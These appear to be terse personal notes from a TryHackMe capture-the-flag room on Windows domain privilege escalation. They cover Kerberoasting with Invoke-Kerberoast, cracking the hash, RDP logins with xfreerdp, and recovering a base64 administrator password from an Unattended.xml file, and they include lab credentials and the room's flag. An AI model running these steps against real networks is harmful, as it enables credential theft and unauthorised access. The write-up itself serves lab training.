![[Pasted image 20210601215804.png]]

![[Pasted image 20210601215746.png]]

`Invoke-Kerberoast -OutputFormat hashcat `

![[Pasted image 20210601215626.png]]

cracking the hash

![[Pasted image 20210601215540.png]]

2nd user: `fela:rubenF124`

![[Pasted image 20210601215847.png]]

`xfreerdp /u:'corp\fela' /p:rubenF124 /v:10.10.107.196`

![[Pasted image 20210601232617.png]]

`type C:\Windows\Panther\Unattend\Unattended.xml`

![[Pasted image 20210601235853.png]]

`dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=`

`xfreerdp /u:'corp\Administrator' /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' /v:10.10.107.196`

and after login you have to change the password with the same complexity 

admin == THM{g00d_j0b_SYS4DM1n_M4s73R}


![[Pasted image 20210601235532.png]]